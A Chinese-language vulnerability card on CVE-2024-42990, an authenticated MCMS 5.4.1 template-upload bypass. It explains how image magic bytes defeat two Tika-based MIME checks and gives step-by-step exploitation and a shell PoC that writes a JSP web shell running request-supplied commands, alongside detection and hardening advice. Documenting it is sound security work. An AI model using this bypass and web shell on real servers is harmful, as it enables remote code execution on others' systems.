---
id: web-generic-file-upload-mcms-uploadtemplate-zip-magic-header-jsp
title: MCMS v5.4.1 后台 uploadTemplate 压缩包上传：添加图片魔数绕过 AOP 的 zip 内后缀检查 + 改写 jsp 文件头绕过 Controller 二次类型检查
type: scenario
domain: web
path: web/generic/file-upload
technique: zip-upload-magic-bytes-extension-check-bypass
aliases:
- MCMS uploadTemplate 上传绕过
- checkZip 绕过
- 压缩包内 jsp 后缀检测绕过
- 文件头伪装绕过 MimeType 校验
- CVE-2024-42990
tags:
- web
- file-upload
- java
- zip
- magic-bytes
- content-type
- jsp
- rce
- cve-2024-42990
cve:
- CVE-2024-42990
severity: high
confidence: medium
status: verified
created: '2026-11-10'
updated: '2026-11-09'
affected_versions: MCMS <= 5.4.1（原文审计 5.4.1，5.4.2 已修复）
verification:
  verified_by: verifier-T2-3W7
  verified_at: '2026-11-09T01:57:44+08:00'
  notes: 已对照原文核对；FileVerifyAop.uploadAop（getMimeType 为 zip 才 checkZip）、fileAllowFiles 与 DetectReader.detect 取值逻辑、ManageFileAction.uploadTemplate 二次 getType 均与正文代码一致；已按原文补 affected_versions=MCMS <= 5.4.1（5.4.2 已修复）；本次核对未读取图片，「加图片头后 Tika 判成图片」与最终访问 jsp 的效果仅在截图中，PoC 请求体原文未给，属作者自述
---

## 一句话结论

MCMS 后台 `/ms/file/uploadTemplate.do` 的压缩包上传有两次相互独立的类型判定：`FileVerifyAop` 用 `BasicUtil.getMimeType` 判断「是不是 zip」来决定要不要拆包检查内部后缀，`ManageFileAction` 又独立判一次「是不是 zip」。两处判定都基于 Apache Tika 的 `DetectReader`（魔数 + 文件名/`Content-Type` 提示），攻击者只要给恶意压缩包加图片文件头、给包内 jsp 也加图片文件头，就能让两次判定都判成图片，跳过检查并把 jsp 写进模板目录执行。

## 原理

- **第一道检查依赖「类型识别结果」而非真实格式**：`uploadAop` 先把文件名交给 `FileNameUtil.cleanInvalid`，再用 `BasicUtil.getMimeType(inputStream, fileName)` 取 MIME；只有返回值等于 `zip` 时才调用 `checkZip(file, false)`。`checkZip` 才是真正解压并逐项比对后缀的那一步。也就是说，**让 MIME 不等于 zip，整个内部后缀检查就不会执行**。
- **`getMimeType` 的结果可被文件内容左右**：Tika 的 `DetectReader`/`detect` 先按文件魔数（magic header）得出 `possibleTypes`，再用 `resourceName` 的后缀提示和 `Content-Type` 头做 `applyHint` 修补，最后取 `possibleTypes.get(0)`。魔数识别优先级高于后缀提示，因此「zip 文件头 + 图片魔数前缀」会被判成图片类型；这正是原文用 `eval` 断点确认的落点。
- **第二道检查同样只看类型**：`ManageFileAction.uploadTemplate` 在真正落盘/解压前又调用了一次 `getType`，判定依据同样是二进制内容。所以第一层绕过之后如果还报错，说明撞上了这一层，需要给包内 jsp 文件也加上图片文件头（图片头在 jsp 里不构成语法错误，Tomcat 仍会把整文件当 JSP 编译）。
- 本质问题是**把「危险后缀」的判定建立在可伪造的 MIME 嗅探之上**：过滤器用内容判定类型，而内容由上传者完全控制；真正的安全边界（解压后逐文件白名单校验、落盘目录是否可执行）没有建立。

## 触发条件

- 已获得后台权限，能访问模板上传接口（原文为 `/ms-mcms/ms/file/uploadTemplate.do`）。
- 服务器为 Tomcat 等会把解压目录当 Web 目录解析 jsp 的容器；上传落点可被外部 HTTP 访问。
- 未部署「解压后按真实文件内容做后缀白名单 + 禁止在 Web 可访问目录解压」的加固。

## 利用步骤

1. 登录后台，找到模板/文件上传位置（原文抓包得路由 `/ms-mcms/ms/file/uploadTemplate.do`）。
2. 先直接上传一个内含 `.jsp` 的 zip，确认报错，定位校验点：AOP 中的 `checkZip`（提示内容来自 `FileVerifyAop.uploadAop`）。
3. 给 zip 文件头前拼接图片魔数（如 GIF/PNG 头），使 `getMimeType` 返回图片类型而不再是 `zip`，从而不进入 `checkZip`。
4. 若仍被拦截（错误信息与第一次不同），说明 `ManageFileAction.uploadTemplate` 里的 `getType` 也在判定；给包内 `.jsp` 文件头同样加上图片魔数。
5. 重新打包上传，等待解压；直接访问模板目录下对应的 `.jsp` 路径，命令执行。

## PoC

原文无完整脚本，最小流程等价于：

```text
# 1) 构造包内 jsp：图片魔数 + jsp 代码
printf '\x89PNG\r\n\x1a\n' > shell.jsp
printf '<%% if("x".equals(request.getParameter("p"))){ java.lang.Runtime.getRuntime().exec(request.getParameter("c")); } %%>' >> shell.jsp
# 2) 打包后在 zip 头部再拼图片魔数（使整体 MIME 判成图片）
printf '\x89PNG\r\n\x1a\n' > poc.zip && cat shell.zip >> poc.zip
# 3) multipart 上传到 uploadTemplate 路由，再访问解压出的 jsp
```

关键点只在两处：zip 整体文件头、包内 jsp 文件头。原文未给出请求体原文，PoC 细节未在文中完整披露。

## 变体与关联

- 变体：MIME 判定换成其他嗅探实现（Tika、`finfo`、`mime_content_type`）时，同样可以用「危险文件 + 合法类型魔数」组合绕过；若校验只看后缀提示（`applyHint` 路径），则可反向利用后缀与内容不一致。
- 变体：压缩包内不是 jsp 而是其他可解析扩展（jspx、jspf、war 部署），或把 zip 换成 tar 触发同类「只解压不校验」路径。
- 关联：同篇的另一个前台入口（UEditor `editor.do` 上传 xml 到 Tomcat `conf/Catalina/localhost` 触发 JNDI）见 `web/java/deserialization/jndi` 下相关卡；通用「上传落点可执行」问题见 `web/generic/file-upload` 其他压缩包解压卡。

## 检测与防御

- **检测**：上传请求中文件名后缀与文件魔数不一致（图片头 + zip 结构、图片头 + `<%@`/`<%`）；解压产物中出现 jsp/jspx/war 等可执行扩展；模板/上传目录中新增可被 Web 访问的脚本文件；访问日志里对上传目录下 `.jsp` 的 GET 紧随一次上传请求。
- **防御**：不要用 MIME 嗅探作为唯一守卫——解压后必须按**真实文件名/内容**做后缀白名单，禁止 jsp/jspx/war/class 落地；上传目录与 Web 可解析目录分离（挂载为不可执行，或由反向代理直接拒绝脚本扩展）；把上传与解压动作放到独立服务并以最小权限执行；升级到已修复版本。
- **边界**：需要后台权限；原文靶场为 Tomcat 打包 war，其他容器（Jetty/Undertow）对「图片头 + jsp」的处理可能不同，未验证。
